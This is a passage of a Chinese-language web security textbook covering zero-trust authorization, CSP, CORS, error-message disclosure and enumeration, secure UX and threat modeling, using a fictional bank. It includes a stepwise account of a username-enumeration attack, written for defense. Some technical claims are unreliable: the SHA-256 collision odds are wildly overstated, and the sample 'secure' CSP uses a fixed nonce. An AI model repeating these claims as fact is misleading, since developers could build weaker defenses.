想象一座周围有护城河环绕的城堡。因为护城河的目的在于阻挡意外访客进入城堡，所以可以假定，任何已经在城堡内、越过护城河边界的人都是可以信任的。这是一个隐式信任模型，因为越过护城河之后就没有进一步的验证。在这个例子中，护城河是判断一个人应该被信任还是不被信任的唯一决定因素——这完全没有考虑到意外访客游过护城河的边缘案例。

一个类似且与现实更相关的隐式信任示例可能是一个由防火墙保护的网络，但该网络对于任何已越过防火墙的请求不进行任何验证。NIST 认为，这种信任模型已经过时，并会导致产生脆弱且极易被利用的 Web 应用。

根据 NIST 的指导，一个更好的模型是“信任但验证”（trust but verify）或显式信任模型。在这样的模型中，应用在设计时要求：只要调用特权功能，就会进行验证。这意味着仅仅存在于隐式信任区域内（例如，AWS 云账户、越过服务器防火墙、之前成功的身份验证检查等）是不够的。

根据零信任架构，每一个可能导致系统失陷的操作都必须在其之前设有一个验证步骤，以确保请求者或调用者确实是他们所声称的人，并且仍然持有适当的权限。

#### 身份验证与授权

到目前为止，您可能已经注意到，零信任架构与最小权限原则（Principle of Least Privilege）有很大的重叠。情况确实如此，因为零信任架构的核心是花费大量时间来确保一个主体（脚本、用户等）只能访问专门为其准备的资源。

但还有其他一些情况，零信任在其中同样能带来益处。设想这样一个案例：某家企业的员工担任高级职务，该角色在公司的内部软件中拥有巨大的权限。我们称这名员工为 Joe Admin，因为该员工拥有管理员权限，可以高度访问内部软件。

在日常工作中，Joe 使用大量的软件服务来查看公司财务状况、评估商业交易等。他甚至可以访问公司的银行账户。

一天，Joe 因洗钱（或任何其他合法原因）被公司开除。然而，这家公司的内部软件在架构设计上，用于身份验证和授权的令牌有 48 小时的过期窗口。

这并不少见，而在这种情况下，Joe 一直使用的软件仅仅去寻找一个有效的授权令牌，而不以任何方式验证 Joe 作为高级员工的状态是否发生改变。正因如此，Joe 在被开除后仍然能够使用上述软件，并通过修改公司账目企图进行报复，从而造成了额外的混乱。

零信任授权，或应用零信任原则的授权架构，本可以阻止这种边缘案例的发生。攻击之所以发生，是因为信任被隐式地授予了任何持有未过期访问令牌的用户——而未考虑用户雇佣状态可能发生的改变。在每个授权步骤中融入 NIST 定义的零信任，本可以实现持续授权（Continuous Authorization），从而防止这种针对内部系统的攻击。

### 总结

构建应用时需要考虑许多隐患。每当产品团队开发一个新应用时，安全工程师或架构师也应该仔细分析该应用的设计和架构。深层的安全缺陷——例如不恰当的身份验证方案，或与搜索引擎半吊子的集成——可能会让您的应用面临难以轻易解决的风险。一旦付费客户开始在他们的工作流中依赖您的应用，尤其是在合同拟定并签署之后，解决架构级的安全 Bug 将会成为一项艰巨的任务。

在本章的开头，我引用了 NIST 的估算：在应用的架构阶段发现的安全缺陷，其修复成本比在生产环境中发现要便宜 30 到 60 倍。这可能是由多种因素共同作用的结果，包括以下几点：

* 客户可能已经依赖于不安全的功能，这会导致您必须构建安全的等效功能，并为他们提供迁移方案，以避免遇到停机时间。
* 深层的架构级安全缺陷可能需要重写除不安全模块之外的大量模块。例如，一个具有缺陷多人游戏模块的复杂 3D 游戏，可能不仅需要重写网络模块，还需要重写构建在多人网络模块之上的游戏模块。如果为了提高安全性而不得不更换底层技术（例如，从用户数据报协议, 即 UDP，迁移到 TCP 网络），情况尤其如此。
* 该安全缺陷可能已经被利用，除工程时间外，还给企业造成了实际的资金损失。
* 该安全缺陷可能会被公开，给受影响的 Web 应用带来糟糕的公关形象，使企业在流失接触机会的同时，也失去那些选择离开的客户。

归根结底，捕获并解决安全隐患的理想阶段始终是架构阶段。在此阶段消除安全问题将在长期内为您节省资金，并消除日后因外部发现或公开而造成的潜在头痛。

---

## 第 22 章 安全的应用配置
向您的客户成功交付安全的 Web 应用，其要素之一是确保您交付的 Web 应用配置得当，能够利用浏览器内置的安全机制。

如今的 Web 应用构建在众多的语言、框架和技术之上。然而，由于 Web 应用的唯一交付方式仍然是浏览器，因此学习如何利用浏览器内置的安全机制对于获得良好的安全姿态（Security Posture）至关重要。

在本章中，我们将评估并讨论由浏览器实现的几种安全技术。您还将学习如何正确配置它们，以最大程度地提高 Web 应用的安全性。

### 内容安全策略

内容安全策略（Content Security Policy，CSP）是浏览器用于防御涉及浏览器客户端的最常见网络攻击形式的主要安全机制之一。如果实现得当，它能够防止跨站脚本（Cross-Site Scripting，XSS）、数据注入、钓鱼（Phishing）、框架嵌套（Framing）和重定向（Redirect）攻击。

为了提供良好的开发人员体验同时不破坏现有的互联网生态，CSP 在设计上提供了大量的配置选项。正因如此，强有力的 CSP 策略与脆弱的 CSP 策略之间存在天壤之别。实际上，运行一个完全没有任何 CSP 策略且运转正常的网站是完全可能的，这会导致浏览器对常见的攻击不实施任何缓解措施。

让我们从实现的视角来深入了解 CSP 策略，以便您学习如何在 Web 应用上正确配置 CSP 策略，从而允许浏览器代表您的用户实施安全机制。

#### 实现 CSP

在 Web 应用上可以通过两种方法之一来实现 CSP。最常见的方法是让您的服务器在处理每个请求时返回一个 `Content-Security-Policy` 响应头。请注意，`X-Content-Security-Policy` 和 `X-Webkit-CSP` 响应头已被弃用，不应再用于实现 CSP 策略。

或者，您可以通过在每个 HTML 页面的 `<HEAD></HEAD>` 中包含一个 `meta` 标签来实现 CSP 策略。这样的 `meta` 标签示例如下：

```html
<meta
 http-equiv="Content-Security-Policy"
 content="default-src 'self'; img-src data:" />
```

#### CSP 结构

无论您选择哪种实现方式，配置 CSP 策略的方法大致相同。CSP 策略由指令（Directives）组成，指令之间由分号（`;`）隔开。在每个指令之后，您可以包含与该指令对应的配置选项，然后该选项将由浏览器执行。

一个指令的示例是 `script-src scripts.mega-bank.com`，这将仅允许网站执行源自所提供的源 `scripts.mega-bank.com` 的 JavaScript 脚本。所有其他脚本都将在浏览器控制台（Console）中抛出 CSP 错误。

#### 重要指令

CSP 支持的指令列表因浏览器而异，且随着浏览器的更新和对最新版本 CSP 规范的遵守而定期扩充。目前，CSP 规范由万维网联盟（World Wide Web Consortium，W3C）这一维护各种 Web 标准的非营利组织进行维护。

从安全角度来看，以下是一些最重要的指令：

**default-src**
> 这是其他指令的备用（Fallback）指令，用于对可以加载图像、脚本、CSS 样式表和其他资源的源进行白名单（Allow-lists）配置。定义此指令可防止您的网站执行非预期的脚本，从而显著降低 XSS 风险。

**sandbox**
> 配置后，此指令会在页面加载时创建一个沙箱（Sandbox），防止资源能够创建弹窗、执行脚本或与浏览器插件进行交互。

**frame-ancestors**
> 此指令定义了哪些网页可以嵌入当前网页。将其设置为 `'none'` 通常是最安全的选项，因为这可以防止其他网站通过在当前网页前放置用户界面元素并欺骗用户点击它们来进行点击劫持（Clickjacking）攻击。

**eval and inline script**
> 仅仅通过实现任何 CSP 策略，这些功能在默认情况下都会被阻断。这是一个巨大的胜利，因为这两种脚本执行方式都是 XSS 攻击的常用攻击向量。然而，这些功能可以通过 `'unsafe-inline'` 和 `'unsafe-eval'` 进行启用（即停用限制）。

**report-uri**
> 此指令允许您定义一个接收端点（Endpoint），CSP 错误将报告至该端点进行日志记录。

#### CSP 源与源列表

CSP 策略中以 `-src` 结尾的指令接受被称为源列表（Source List）的输入——即以空格分隔的源（Origins）和 CSP 特有配置值的列表。源列表用于告知指令在加载到浏览器中后如何运作。有几个源是 CSP 特有的，理解它们如何运作非常重要：

**\***

> 此通配符运算符允许任何 URL，但 `blob` 和 `file` 除外。例如，`image-src *` 允许来自任何基于 Web 的源的图像，但不允许来自本地文件系统。

**'none'**
> 这会阻止加载任何源。请注意，在指令后包含 `'none'` 的 CSP 策略绝不能包含其他源，否则该 CSP 策略将无法加载。例如，`image-src 'none'` 是有效的，但 `image-src 'none' images.mega-bank.com` 是无效的。

**data:**
> 这允许加载 Base64 编码的图像。例如：`img-src data:`。

**https:**
> 这允许加载资源，前提是源列表中的资源全部实现 HTTPS。例如：`img-src https: mega-bank.com`。

**'self'**
> 这指向当前加载页面的源。如果一个网页加载到 `test.mega-bank.com/123`，只要 CSP 策略设置为 `img-src 'self'`，任何来自于 `test.mega-bank.com/*` 的图像都将能够加载。

#### 严格的 CSP

有时您正在构建一个更为复杂的 Web 应用，需要加载内联脚本（Inline Script）的能力。然而，您希望避免为所有脚本启用内联脚本的陷阱，因为它是最常见的 XSS 攻击向量之一。

通过 CSP，花少许精力就可以安全地启用内联脚本。这种形式的 CSP 配置通常被称为严格的 CSP（Strict CSP），因为它为在浏览器中运行的脚本提供了额外的安全规则以防御 XSS，但它并不限制功能。

有两种实现严格 CSP 策略的方法。第一种方法是基于哈希（Hash-based）的严格 CSP，第二种是基于 Nonce（Nonce-based）的严格 CSP。这两种方法都要求常见的 XSS 接收启点（Sinks）实现随机化的 Nonce 或 SHA-256 哈希，这将在每次脚本执行前进行校验。

一个简单的基于 Nonce 的严格 CSP 实现如下所示：

```http
Content-Security-Policy:
 script-src 'nonce-{RANDOM}' 'strict-dynamic';
```

当 CSP 策略设置为具有 `'nonce-{RANDOM}'` 的 `'strict-dynamic'` 时，浏览器将强制要求内联脚本提供一个新属性 `nonce`。为了遵守这一点，内联脚本将如下所示：

```html
<script src="..." nonce="123">alert()</script>
```

Nonce 值在运行时创建，并且您的每个脚本在加载时都带有正确的 Nonce 值。在脚本执行之前，浏览器会进行检查以确保脚本属性中的 Nonce 与预定义的值相匹配。如果匹配，脚本继续执行（从带有正确 Nonce 的顶层脚本中加载的动态脚本也可以加载）。如果不匹配，脚本执行失败，并在控制台中抛出 CSP 错误。

基于哈希的方法运行机制类似，但不使用随机化的 Nonce，而是使用 SHA-256 哈希。在基于哈希的情况下，每一个内联脚本的哈希值都会被添加到 CSP 指令 `script-src` 的源列表中。当内联脚本尝试执行时，它会被计算哈希并与源列表进行比对。如果未能通过该检查，控制台中将抛出错误，且脚本无法执行。

基于 Nonce 的严格 CSP 非常适合每个网页都在服务端渲染的场景，这允许在每次页面加载时创建新的 Nonce。

对于需要缓存（例如，使用 CDN）的应用，基于哈希的 CSP 更好，因为 SHA-256 哈希的冲突率极低，以至于两个脚本发生冲突（一个恶意脚本创建出与非恶意脚本相同的哈希）的概率大约在 $1/43,000,000,000$ 左右。因为 CDN 和缓存通常会维持相当长的时间，黑客可以构建出一个与当前 Nonce 匹配的内联脚本 Payload。然而，他们极不可能构建出一个在同一页面中与非恶意脚本计算出完全相同哈希的内联脚本 Payload。

#### 示例安全 CSP 策略

以下是一个默认安全的 CSP 策略，在进行进一步自定义之前，它可以用作初始策略。它提供了在脚本源上实现严格 CSP 的 Nonce 策略示例，阻断了 `frame-ancestors` 以防御点击劫持攻击，在图像上强制执行 HTTPS 的同时允许 Base64 图像加载，提供了一个用于报告 CSP 错误的响应 URI，并提供了一个默认的 `'self'` 作为源列表的备用。实现该 CSP 的代码如下：

```http
Content-Security-Policy
 default-src 'self';
 script-src 'self' 'nonce-jgoj23j2o3j2oij26jk2nkn26kjh23' 'strict-dynamic';
 frame-ancestors 'none';
 img-src data: https:;
 report-uri https://reporting.megabank.com
```

### 跨源资源共享

跨源资源共享（Cross-Origin Resource Sharing，CORS）是一种由浏览器实现的安全机制，经常与 CSP 混淆。虽然 CSP 允许开发人员选择允许在浏览器中执行哪些脚本，但 CORS 能够在更早的阶段阻止脚本，使其甚至无法到达浏览器中的 JavaScript 执行上下文。

CORS 的重要性部分在于：在 JavaScript（浏览器唯一支持的编程语言）中执行网络请求的两种主要方法是 `fetch` 和 `XMLHTTPRequest`。这两个 API 都遵守一个被称为同源策略（Same Origin Policy，SOP）的概念，该策略规定，除非在 CORS 策略中另有定义，否则 Web 应用应该只能在其自身（相同）的源内进行网络调用。

需要重点指出的是，如果没有 SOP，浏览器内 JavaScript 代码中的 `fetch` 或 `XMLHTTPRequest` 就可以对另一个网站（不是该代码在其中执行的网站）执行特权操作。这是因为浏览器会自动将 Cookie 附加到网络请求中，这意味着如果用户在标签页 #2 中的电子商务商店上完成了身份验证，如果 SOP 不存在，标签页 #1 就可以对该电子商务商店发起购买（这被称为跨站请求伪造，即 CSRF 攻击）。

CORS 为我们提供了一种配置解决方案，使开发人员能够允许特定的跨源请求完成，而不会显著降低安全姿态（就像停用 SOP 所发生的那样）。

#### CORS 请求的类型

检查 CORS 策略的方法有两种。这些通常被称为简单 CORS 方法（Simple CORS method）和预检 CORS 方法（Preflight CORS method）。

由 WHATWG 组织维护的规范指出，虽然简单版本的检查对于最常见的网络请求已经足够，但对于任何非常规的或改变状态的请求，都应该使用预检。

##### 简单 CORS 请求

一个简单请求可以是 POST、HEAD 或 GET 请求，但它必须满足规范中列出的若干条件。首先，简单请求只能包含少数几个选定的请求头。这些在文档中被称为“CORS 安全列表请求头”（CORS-safelisted headers）：

* Accept
* Accept-Language
* Content-Language
* Content-Type

其次，`Content-Type` 请求头必须仅包含以下值之一：`application/x-www-form-urlencoded`、`multipart/form-data` 或 `text/plain`。

最后，源自浏览器的网络请求不得使用高级网络请求功能，例如附加在 `XMLHTTPRequest` 对象上的事件监听器（Event Listeners）。

如果满足所有这些条件，浏览器将在网络请求中附加一个请求头：`origin: <source-origin>`。如果请求的服务器配置正确，它将返回一个 HTTP 状态码 200，并附加另一个请求头：`access-control-allow-origin: <source-origin>`。

如果浏览器提供的请求头中所包含的源与服务器提供的响应头不匹配，来自服务器的响应将不会被传回给脚本执行，并且浏览器控制台将抛出 CORS 策略错误。

##### 预检 CORS 请求

任何不满足作为简单请求执行标准的请求都将作为预检请求（Preflighted Request）执行。

在预检请求中，浏览器将发送一个预检，这仅仅是一个格式化为包含以下请求头的 HTTP OPTIONS 请求：

* `origin: <source-origin>`
* `access-control-request-method: <permitted HTTP method>`
* `access-control-request-headers: <permitted HTTP headers>`

与简单请求类似，如果这些检查中的任何一项在预检请求上失败，浏览器网络栈将不会把响应传递给脚本执行上下文，而是会抛出 CORS 策略错误。

预检请求背后的设计理论是：在确定服务器和浏览器是否被允许通过匹配的 CORS 头进行通信之前，它们通过拒绝向服务器传递任何相关数据或操作来提供更多的安全性。

#### 实现 CORS

虽然浏览器决定了在出站网络请求中附加哪些 `origin`、`access-control-request-method` 和 `access-control-request-headers`，但仍然需要由应用开发人员来正确配置服务器，以便使用适当的响应来匹配入站的 CORS 网络请求。

大多数现代服务器软件套件都提供了简单的 CORS 中间件（Middleware），通常抽象掉了大部分 CORS 配置。在服务端 JavaScript 生态系统中，这通常是使用 `cors` npm 模块完成的：

```javascript
const express = require('express');
const app = express();
const cors = require('cors');

const corsOptions = {
 origin: 'https://mega-bank.com'
};

app.get('/users/:id', cors(corsOptions), function (req, res, next) {
 res.sendStatus(200);
});

app.listen(443, function () {
 console.log('listening on port 443')
});
```

与浏览器中许多其他基于配置的工具一样，CORS 接受多种用于定义允许源的机制——包括通配符（`*`）。务必牢记最小权限原则，授予服务端 CORS 策略最小范围的源，而不是最大范围。因此，应该只将您应用运行所需的特定源加入白名单。

---

## 第 23 章安全的用户体验
在安全 Web 应用的构建中，用户界面（User Interface，UI）是一个经常被遗忘的组件。UI 是终端用户与任何 Web 应用进行交互的标准方式。高度专业化的 Web 应用可能会允许用户通过命令行界面（Command Line Interface，CLI）、REST API 甚至 XML 或 JSON 文件进行交互。但绝大多数应用和终端用户还是更倾向于通过用户界面进行交互。

在 Web 端，由于浏览器计算模型的局限性，UI 被限制在少数几项技术内。通常这些界面是由 HTML、CSS 和 JavaScript 构建的，但尽管存在安全和性能方面的局限，它们也可能会使用插件（Plug-ins）或小程序（Applets）（例如 Java）。

在本章中，我们不会聚焦于支撑 UI 的技术（例如 JavaScript、CSS、HTML）。相反，我们将重点关注由这些技术输出的应用界面的设计、体验和易用性（Usability），终端用户正是通过这些界面进行交互的。闲话少说，让我们来探讨开发人员在生产 UI 时经常犯的一些安全错误，并评估针对这些安全差距的潜在解决方案。

### 信息泄露与枚举

信息泄露（Information Disclosure）漏洞和枚举（Enumeration）漏洞有着一组共同的识别特征，并且（通常）源于需要向 UI 填充有用数据的业务需求。然而，通过明智的用户体验设计，这两种漏洞都是可以避免或至少得到缓解的。

#### 信息泄露

在为 Web 应用设计 UI 时，首先也是最重要的一点是考虑您打算向终端用户提供多少信息。乍看之下，这似乎是一个很容易解决的问题，但进一步思考后，您会发现 UI 的主要目的就是向终端用户提供信息。事实上，对终端用户而言，如果一个界面提供更多的信息而不是更少，它往往会显得更好。

从这个视角来看，我们面临的挑战就变成了确定应该向用户提供多少信息，以及哪些信息应该对终端用户保密。我们需要明白，这其中可能存在一些权衡：为了获得更好的信息安全，终端用户的体验可能会有所下降。

有几个经典的、简单的例子可以说明：尽管初衷是为了改善用户体验，但额外的信息泄露会给您的 Web 应用带来安全风险。让我们考虑这样一个案例：您是一名安全工程师，与几位才华横溢的 UX 设计师共同开发一个 Web 应用。

您团队中的设计师们（这完全合情合理）希望通过向终端用户提供详细的错误消息来改善用户体验，以便当 Web 应用中的表单提交失败时，终端用户能够清楚发生了何种问题。实现这种错误消息的方法有很多。让我们考虑以下几种可能的实现方案：

* 将服务端的错误消息和错误码直接回显给用户。
* 如果错误消息存在于预定义的白名单（Allowlist）中，则将服务端的错误消息和错误码回显给用户。
* 在客户端代码中确定一条通用的错误消息，并与服务端的错误码一同提供给用户。
* 仅提供服务端错误码。
* 既不提供错误消息，也不提供服务端错误码。

有趣的是，事实证明，既不提供错误消息也不提供服务端错误码（从技术上讲）是最安全的选项——尽管由于可用性方面的折中，这可能并不是一个正确的选项。

在这种情况中，权衡评估至关重要。开发人员绝不应该泄露关于应用源代码的、可能导致指纹识别（Fingerprinting）的信息，但关于服务器状态的信息对用户来说可能是有价值的。

在向终端用户披露有关服务器状态的信息时，确保这些信息经过过滤和格式化以最小化潜在风险是至关重要的。例如，当查询失败时，与其在查询失败时直接回显来自数据库或中间件的错误消息，不如以通用的语气创建一个常见失败案例的白名单，并返回最接近的匹配项。

考虑以下错误消息：“由于提供的地址 905 N. Main St. 与当前归档文件不匹配，无法查询用户 Jonathan Smith。”

这条错误消息可以用一条通用的消息来替换，这样就不会泄露地址，从而减少了意外信息泄露的机会。一个改进后的通用错误消息可能类似于：“由于地址不匹配，无法查询该用户。”

虽然与简单地返回“发生错误”相比，这仍然向客户端提供了更多信息，但白名单通用错误方法提供了有关原因的信息，且没有重大信息泄露的风险。

请记住，服务端的错误消息会随着数据库和中间件的升级而随时间发生变化。因此，如果没有一个由预定义错误消息组成的健壮白名单，信息泄露虽然现在可能不会发生，但在未来的某个时间点可能会发生。

在向客户端返回错误消息的同时返回 HTTP 错误码时，最佳实践通常是使用一个通用的状态码，这样就无法轻易对您的 Web 服务器进行侦察。通用错误码“400 - bad request”通常是首选，因为它提供的数据比更具体或更健壮的错误码要少。

然而，如果您有幽默感，您可以选择返回“418 - I’m a teapot”（我是一个茶壶），这是一个未被使用的错误码，早在 1998 年作为愚人节玩笑被引入 HTTP 规范中（但仍被大多数 Web 服务器支持）。使用类似“418 - I’m a teapot”的错误码的好处在于，由于它没有官方的实际用途，它极不可能干扰开发人员所使用的任何第三方工具。

在某些情况下，非通用的错误码可能更可取，例如，如果您的 API 被多个期望获得网络调用状态详细信息的客户端所使用。在这种情况下，提供更具体的错误码是可以接受的，但应当对每个 API 端点进行逐案评估，以确定所提供的错误码是否会泄露任何可以被利用的应用状态形式。

#### 枚举

当具有相似结构的多个查询导致信息泄露时，或者当这些查询的总和（或查询组合）可用于推断客户端不应有权访问的信息时，就会发生枚举漏洞。有许多枚举漏洞导致信息以非预期方式泄露的例子。

例如，如果一个 API `GET /user/:id` 允许查找单个用户，而数据库中该用户的 `:id` 列是一个可递增的整数（例如，1, 2, 3 等），那么通过使用连续的数字重复请求 `GET /user/:id` 端点，攻击者就能够推断出系统内的用户总数。这可能不是高风险信息，但它仍然是未打算公开的信息。

一个稍微严重一些的枚举漏洞示例如下：

1. 黑客发现了一个未打算暴露给互联网的管理员界面。该管理员界面属于 MegaBank，允许特定的 MegaBank 用户子集远程管理用户账户和余额。
2. 黑客无法突破身份验证机制，因此选择尝试寻找有效的“用户名:密码”组合，以便作为员工登录。
3. 黑客注意到，某些“用户名:密码”身份验证尝试会产生错误“密码错误”（wrong password），而其他尝试则会产生错误“用户不存在”（user does not exist）。
4. 黑客收集了其他网站的数据泄露列表，并假设部分 MegaBank 员工在这些被泄露的网站上拥有账户。泄露的数据包含用户名和电子邮件地址。被泄露的网站示例包括兴趣论坛和小型电子商务网站。
5. 黑客找到了 `@megabank.com` 员工的电子邮件地址，并将相关的用户名塞入管理员 API 中，生成了一份在认证尝试期间返回“密码错误”的用户电子表格（这就是**枚举步骤**）。
6. 现在黑客已经确定了哪些 MegaBank 用户名在管理员账户上有效，黑客就可以利用其他技术（数据泄露、社会工程学、暴力破解、字典）来寻找有效密码并登录。

您可能会问，为什么这种形式的枚举如此重要？难道攻击者不能从一开始就直接暴力破解这些组合吗？

事实是，暴力破解、字典攻击和其他侵入用户账户的方法缺乏精确性，容易被检测到，且有时在数学上是不可行的。通过发现并利用枚举缺陷，暴力破解攻击的复杂度将大大降低，因为“用户名:密码”组合不再是目标，而仅仅是针对已知用户名的有效密码。

此外，如果检测是一个风险，或者速率限制（Rate Limiting）是一个问题，攻击者可以使用高度针对性的方法来收集密码（例如，鱼叉式钓鱼），并且这些方法将不会被察觉。

在应用中避免枚举的最常见机制是在设计时确保满足以下三个标准：

* 当向终端用户提供错误时，它们应当以通用的方式提供（类似于缓解信息泄露），从而使多次调用无法累积可用于恶意的敏感数据。
  
  例如，OWASP 建议所有身份验证失败都使用通用的错误消息“身份验证失败”，而不是具体说明是用户名、密码（或其组合）导致了失败。

* 在设计可以由用户交互的任何形式的数据结构或代码模块时，应避免使用任何容易被猜到的规律或字符序列。
  
  例如，将您的 API 端点命名为 `1/2/3/4/5` 会被视为一种糟糕的实践。同样，根据注册日期创建用户 ID 也会被视为一种糟糕的实践。

* 对任何和所有可能存在枚举风险的 API 端点强制执行速率限制，以降低程序化重复访问向攻击者暴露有价值信息的风险。
  
  速率限制应该通过观察合法用户需要访问的平均请求数来确定，并在合法使用模型的上限处创建一个限制。

总之，枚举漏洞的缓解方法与信息泄露漏洞的缓解方法有许多相同之处。如果您将枚举视为一种在相对无害的数据被反复泄露时发生的信息泄露形式，那么缓解此类攻击就会变得相当简单。

### 安全用户体验最佳实践

除了呈现在用户体验层的漏洞和安全风险外，应用中的用户体验层还是教育和引导您的终端用户以安全方式使用应用的理想场所之一。

维基百科将恶意设计（Dark Pattern，或称黑暗模式）定义为一种欺骗用户调用其未打算调用的功能的 UI 设计模式。这往往会导致用户的安全性或隐私性下降。

恶意设计鲜为人知的反面是我所说的**善意设计（Light Pattern）**，这是一种温柔引导用户改善其安全和隐私的设计模式（见图 23-1）。善意设计是有益的，因为用户往往对 Web 应用的工作原理了解不够，无法为自己做出最佳的安全选择。

在 Web UI 中，安全配置设置旁边的文档页面链接并不是善意设计。它是文档。对于任何合理复杂度的 Web 应用，在拥有任何实质性用户样本的情况下，我们可以假设只有一部分用户会完整阅读文档。这就是善意设计派上用场的地方。善意设计不需要通过在启用或禁用安全机制的页面上添加文档来提示用户去理解一个可选的安全机制，而可以在调用包含安全或隐私风险的功能时，散布在整个应用中。

以一个允许用户之间进行转账的 Web 加密货币钱包（Cryptocurrency Wallet）为例。默认情况下，大多数钱包允许转账任意金额。但许多 Web 钱包提供了可选的限制配置，可以限制失陷账户的受害半径。

安全机制的一个例子是：在包含总计 $100,000 密币的钱包中，每天仅允许转出价值 $1,000 的货币。通过限制每日限额，即使钱包失陷，攻击者也需要 100 天才能清空用户的全部积蓄。这给用户留出了访问其钱包并清除攻击者权限的时间。

此类机制对用户的安全至关重要，但极少被启用。通过在应用的 UI 中添加善意设计，启用上述安全功能的用户转换率可能会大幅提高。但是，具有该目标的善意设计应该在哪里以及如何实现呢？

添加此类善意设计的最佳位置，实际上不是在实现安全控制的设置页面上，而是横跨在调用该安全风险的所有功能中。在每一次向外转账时，应当向用户发出警告，告知其未启用该安全设置，且输入错误的金额可能会导致不可逆的财务损失。通过这种方式，用户不会承担考虑攻击者的负担，而是被提供了一个基于他们自己意外误操作可能导致货币丢失的边缘案例。

在每次交易时向用户展示这种场景会带来更好的转换率，因为用户实际上正在发送货币，并且对发生此类事故的可能性有着直接的切身体会。这比使用攻击者获取其账户权限的案例更有效，因为用户可能没有一个指标来衡量账户被劫持的概率有多大。

每当调用高风险操作时，温柔地向用户提供对应用风险和安全机制的理解，能够引导用户在操作与后果之间建立起联系。与仅仅向用户提供缺乏联系且在大多数情况下根本不会被完整阅读的文档相比，这种模式通常会引导用户以高得多的比例启用安全机制。

请注意，默认安全仍然是优于善意设计的优秀设计模式，但对于无法做到默认安全的情况（例如，无法默认强制用户启用安全机制），应当使用善意设计。

### 总结

总而言之，虽然您发现的大多数漏洞都源于您的应用代码，但您也应该始终意识到您设计用户体验的方式。因为 UI 的主要目标是向终端用户展示数据，所以必须意识到数据的呈现方式，以确保错误的数据不会被访问。

最后，优秀的用户体验可以用来引导终端用户以更安全的方式使用应用。对于功能丰富且存在滥用可能的应用，务必确保在用户面临风险时识别并向其发出警报——引导他们走上最安全的可用路径，以便他们能够避免由于糟糕的用户体验而可能导致的常见陷阱。

---

## 第 24 章威胁建模应用
如果实现得当，威胁建模（Threat Modeling）是改善应用安全姿态的一项非常有价值的方法。如果实现不当或过于仓促，威胁建模活动除了敷衍了事、浪费宝贵的时间之外，毫无用处。

如果妥善实现，威胁建模允许软件工程师和安全工程师以凝聚的方式协同工作。由妥善实现的威胁模型带来的共享工程和安全工作流，允许企业识别威胁（例如，潜在的漏洞）、威胁主体（Threat Actors，例如，潜在的黑客）、现有缓解措施（例如，安全控制）以及威胁与缓解措施之间的增量（Delta）。

一个妥善实现的威胁建模流程除了上述好处之外，还可以作为一份动态文档，用于在工程师之间快速且有效地交接安全知识。它以一种大多数其他方法无法做到的方式，使您组织的安全知识具备健壮性。

虽然您不想使用一个草率实现的威胁建模流程，但从长远来看，学习如何设计和实现一个健壮的威胁建模工作流将极大地改善您组织的安全姿态。

### 设计有效的威胁模型

一个妥善的威胁模型应该能够实现许多目标。如果这些目标未能全部实现，威胁模型的影响将受到限制：

* 文档化知识 (Document knowledge)
* 识别威胁主体 (Identify threat actors)
* 识别风险/攻击向量 (Identify risks / attack vectors)
* 识别缓解措施 (Identify mitigations)
* 识别增量/差距 (Identify delta - between risks and mitigation)

这些主要目标中的每一个都建立在其他目标之上。例如，威胁模型作为一份活的知识库，当它不仅包含有关应用架构的选择数据，还包含其威胁主体、潜在威胁等信息时，才最具价值。

同样，一个仅包含风险识别而不记录缓解措施的威胁模型也是不够理想的，因为风险是不可操作的（Not Actionable）。尽管在某种程度上有其价值，但在已知现有的缓解措施之前，风险是无法被处理的。针对已经具有缓解措施的风险实施缓解措施，是引入更多 Bug、技术债、甚至可能向您的代码库中添加更多漏洞的诱因。

### 威胁建模实例

设想一家虚构的企业 MegaBank 正在实现一项新功能，用户可以通过该功能对 MegaBank 上的现有功能发表评价。这将有助于 MegaBank 确定哪些功能受到了好评，并向其他用户推广这些功能。

得知该功能将面向公众，且如果实现不当极易被滥用，MegaBank 要求其应用安全团队与开发人员共同制定一个威胁模型。MegaBank 安全团队的高级成员 Holly Hacker 看到了这一倡议的价值，并且在了解威胁模型的目标后，她开始与开发团队合作收集数据，以产出上述威胁模型。

#### 逻辑设计

Holly 收集的第一项数据很简单：她从逻辑设计的角度请求了对新功能的描述。在软件产品中，**逻辑设计（Logic Design）**是指从功能性视角对功能或产品的描述。这一视角比工程架构或设计文档更高层，但比市场或销售描述更底层。通常，此描述的详细程度与 UX 设计师所使用的相同。UX 设计师在能够开发出有效的 UI 之前，必须理解应用逻辑。

Holly 整理出的描述如下：

> MegaBank 的“用户评价”功能是一个面向公众的功能，其中已认证的用户将能够填写一份 Web 表单，并针对任何现有的 MegaBank 功能发布评价。评价表单将包含 0 到 5 之间的评分，以及一个基于文本的评价主体。当提交评价时，MegaBank 服务器将把评价内容和分数存储在数据库中，随后，点击任何“激活功能”页面上“显示评价”的用户可以查询到这些评价。这些页面的示例包括“激活加密货币钱包”或“激活银行贷款”功能。MegaBank 当前用户体验的设计是，可选功能在默认情况下是“关闭”的，因此，如果功能成功，这一“用户评价”功能将有助于促进新功能的启用。
>
> ——逻辑设计，MegaBank 用户评价威胁模型

逻辑设计概述对威胁模型至关重要，但它也是最经常被忽视的组件之一。它之所以重要，是因为它稍后可用于发现**逻辑漏洞（Logic Vulnerabilities）**，即由于应用未能遵循其预期运行的应用逻辑而产生的漏洞。这些类型的漏洞不同于传统应用级的漏洞，因为它们对于每个应用及其特定的业务需求而言都是独特的。

在此案例中，逻辑漏洞的一个示例是：用户能够通过绕过 Web 表单并发送自定义 HTTP 请求来发布大于 5 分的评分。在数据库中单单存储一个整数值本身并不是漏洞。然而，在所提供的边缘案例中，由于该功能独特的应用逻辑，这确实是一个漏洞。这是因为任何形式的聚合或平均值都会被一个超出范围的数字所扭曲，误导用户并导致他们失去对 MegaBank 用户评价真实性的信任。这将损害 MegaBank 的品牌声誉。

#### 技术设计

在威胁建模流程中，技术设计的文档化和收集是一个比逻辑设计文档化和收集更常见的步骤。遗憾的是，虽然技术设计对于发现漏洞和描述产品或功能的实现细节非常有效，但它们往往无法解释业务目标和逻辑。这就是为什么需要上述逻辑设计数据收集的原因。

话虽如此，为了确保有效性，技术设计数据的收集和文档化也有一些特殊要求，因此它并不像简单地抓取一些数据流图并将其扔进文档中那样容易。

收集技术设计文档并将其汇总到威胁模型中的目的，是为了让工程师和研究人员稍后能够识别作为应用架构一部分而产生的威胁。

技术设计应该足够全面，以识别应用中的以下关键变量：

* 在实现此功能时使用了哪些工具和技术？
  * 编程语言
  * 数据库
  * 构建工具
  * 包管理器
  * 框架
* 在该功能的实现中使用了哪些第三方服务？
  * 网络内部的第三方服务（例如，类似 S3 的 AWS 子资源）
